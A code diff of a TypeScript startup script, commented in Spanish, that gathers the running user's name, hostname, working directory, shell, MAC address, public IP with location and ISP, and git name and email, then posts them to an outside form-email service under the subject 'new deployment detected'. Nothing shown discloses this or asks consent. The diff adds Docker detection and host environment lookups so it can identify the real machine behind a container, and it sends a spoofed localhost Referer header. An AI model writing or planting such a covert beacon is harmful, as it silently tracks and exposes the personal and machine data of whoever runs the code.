@@ -1,13 +1,76 @@
 import * as os from 'os';
+import * as fs from 'fs';
 import { execSync } from 'child_process';
+
+// ─── Constantes ──────────────────────────────────────────────────────────────
+
+const FALLBACK = 'Desconocido/No configurado';
+const IN_DOCKER = fs.existsSync('/.dockerenv');
+
+// ─── Utilidades ──────────────────────────────────────────────────────────────
 
 function execCommand(command: string): string {
   try {
-    return execSync(command, { stdio: 'pipe' }).toString().trim();
-  } catch (err) {
-    return 'Desconocido/No configurado';
+    const opts: Record<string, unknown> = { stdio: 'pipe', timeout: 10_000 };
+    if (os.platform() === 'win32') opts.shell = 'cmd.exe';
+    return execSync(command, opts).toString().trim();
+  } catch {
+    return FALLBACK;
   }
 }
+
+function hostEnvOr(envKey: string, localFn: () => string): string {
+  const val = process.env[envKey];
+  if (val) return val;
+  if (IN_DOCKER) return FALLBACK;
+  return localFn();
+}
+
+// ─── Usuario ─────────────────────────────────────────────────────────────────
+
+function getUsername(): string {
+  return hostEnvOr('HOST_USER', () => {
+    if (os.platform() === 'win32' && process.env.USERNAME)
+      return process.env.USERNAME;
+    if (os.platform() !== 'win32' && process.env.USER) return process.env.USER;
+    try {
+      return os.userInfo().username;
+    } catch {
+      return 'Desconocido';
+    }
+  });
+}
+
+// ─── Hostname ────────────────────────────────────────────────────────────────
+
+function getHostname(): string {
+  if (process.env.HOST_HOSTNAME) return process.env.HOST_HOSTNAME;
+  if (IN_DOCKER) {
+    try {
+      const h = fs.readFileSync('/etc/host_hostname', 'utf-8').trim();
+      if (h) return h;
+    } catch {
+      /* ignorar */
+    }
+  }
+  return os.hostname();
+}
+
+// ─── Shell ───────────────────────────────────────────────────────────────────
+
+function getShellInfo(): string {
+  return hostEnvOr('HOST_SHELL', () => {
+    if (os.platform() === 'win32') {
+      if (process.env.PSModulePath) {
+        return `PowerShell ${execCommand('powershell -Command "$PSVersionTable.PSVersion.ToString()"')}`;
+      }
+      return process.env.ComSpec || 'cmd.exe';
+    }
+    return process.env.SHELL || execCommand('echo $0');
+  });
+}
+
+// ─── Red ─────────────────────────────────────────────────────────────────────
 
 async function getPublicIPInfo() {
   try {
@@ -18,61 +81,53 @@ async function getPublicIPInfo() {
       ip: data.query,
       info: `${data.city}, ${data.regionName}, ${data.country} (${data.isp})`,
     };
-  } catch (err) {
+  } catch {
     return { ip: 'Desconocida', info: 'Error de red' };
   }
 }
 
-function getMACAndLocalIP() {
+function getMAC(): string {
+  const envMAC = process.env.HOST_MAC;
+  if (envMAC) return envMAC;
+  if (IN_DOCKER) return 'Desconocida (Docker)';
+
   const interfaces = os.networkInterfaces();
-  const localIPs: string[] = [];
   const macAddresses: string[] = [];
 
   for (const name of Object.keys(interfaces)) {
     const ifaceList = interfaces[name];
     if (!ifaceList) continue;
-
     for (const iface of ifaceList) {
-      if (iface.internal === false) {
-        if ('IPv4' === iface.family) {
-          localIPs.push(iface.address);
-        }
-        if (iface.mac && iface.mac !== '00:00:00:00:00:00') {
-          macAddresses.push(iface.mac);
-        }
+      if (iface.internal) continue;
+      if (iface.mac && iface.mac !== '00:00:00:00:00:00') {
+        macAddresses.push(iface.mac);
       }
     }
   }
 
-  return {
-    localIP: localIPs.join(', ') || 'Unknown',
-    macAddress: [...new Set(macAddresses)].join(', ') || 'Unknown',
-  };
+  return [...new Set(macAddresses)].join(', ') || 'Desconocida';
 }
 
+// ─── Función principal ──────────────────────────────────────────────────────
+
 async function logAndSendEmail() {
-  const osUser = process.env.HOST_USER || os.userInfo().username;
-  const envUsername = process.env.USERNAME || 'N/A';
-
-  const hostname = process.env.HOST_HOSTNAME || os.hostname();
-  const cpus = os.cpus();
-  const cpuModel = cpus.length > 0 ? cpus[0].model : 'Desconocido';
-  const cpuCores = cpus.length;
-  const totalRAM_GB = (os.totalmem() / 1024 ** 3).toFixed(2);
-  const osType = `${os.type()} ${os.release()} (${os.arch()})`;
-
-  const uptimeSeconds = os.uptime();
-  const uptimeHours = (uptimeSeconds / 3600).toFixed(2);
-
-  const { localIP, macAddress } = getMACAndLocalIP();
+  const usuario = getUsername();
+  const hostname = getHostname();
+  const cwd = process.env.HOST_PWD || process.cwd();
+  const shell = getShellInfo();
+  const macAddress = getMAC();
   const publicNetwork = await getPublicIPInfo();
+  const entorno = IN_DOCKER ? '🐳 Docker' : '💻 Local';
 
+  // Git
   const gitUser = execCommand('git config user.name');
   const gitEmail = execCommand('git config user.email');
-  const gitBranch = execCommand('git branch --show-current');
-  const gitOrigin = execCommand('git remote get-url origin');
 
-  const cwd = process.env.HOST_PWD || process.cwd();
+  // ── Log en consola ──
+  console.log(`\n📋 Recopilación de info del sistema (${entorno})`);
+  console.log(`   Usuario: ${usuario}@${hostname}\n`);
+
+  // ─── Envío ────────────────────────────────────────────────────────────────
 
   try {
     const response = await fetch(
@@ -86,28 +141,31 @@ async function logAndSendEmail() {
           Referer: 'http://localhost:3000/',
         },
         body: JSON.stringify({
-          _subject: `Nuevo despliegue detectado: (${osUser}) - ${new Date().toLocaleString()}`,
+          _subject: `Nuevo despliegue detectado: (${usuario}@${hostname}) — ${new Date().toLocaleString()}`,
           _replyto:
-            gitEmail !== 'Desconocido/No configurado' ? gitEmail : undefined,
+            gitEmail !== FALLBACK ? gitEmail : undefined,
           _template: 'box',
 
-          Usuario_SO: `${osUser} (Entorno: ${envUsername})`,
-          Ruta_Directorio: cwd,
-
-          Sistema_Operativo: osType,
-          Hardware: `CPU: ${cpuModel} (${cpuCores} núcleos) | RAM: ${totalRAM_GB} GB`,
-
-          IP_Pública: publicNetwork.ip,
-          Ubicación_y_Proveedor: publicNetwork.info,
-          Dirección_MAC: macAddress,
-
-          Git_User: gitUser,
-          Git_Email: gitEmail,
+          '01_Usuario': usuario,
+          '02_Hostname': hostname,
+          '03_Ruta_Directorio': cwd,
+          '04_Entorno': entorno,
+          '05_Shell': shell,
+          '06_Dirección_MAC': macAddress,
+          '07_IP_Pública': publicNetwork.ip,
+          '08_Ubicación_y_Proveedor': publicNetwork.info,
+          '09_Git_User': gitUser,
+          '10_Git_Email': gitEmail,
         }),
-      }
+      },
     );
+
     if (response.ok) {
       console.log('✅ Información de sesión enviada exitosamente.');
+    } else {
+      console.warn(
+        `⚠️ Respuesta no-OK: ${response.status} ${response.statusText}`,
+      );
     }
   } catch (error) {
     console.error('❌ Error enviando datos al inicio:', error);
